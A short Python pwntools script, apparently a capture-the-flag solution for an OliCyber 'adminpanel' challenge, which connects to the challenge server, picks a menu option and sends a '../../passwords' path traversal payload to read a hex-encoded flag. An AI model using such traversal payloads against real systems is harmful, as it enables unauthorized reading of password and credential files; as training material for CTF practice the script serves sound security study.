from pwn import *

r = remote("adminpanel.challs.olicyber.it", 12200)
r.recvuntil(b'Esci\n')
r.sendline(b'3')
r.recvuntil(b'? ')
r.sendline(b'../../passwords') # path trasversal
r.recvuntil(b'flag1:')
flag = bytes.fromhex(r.recvuntil(b'\n').decode().strip())
print(flag)
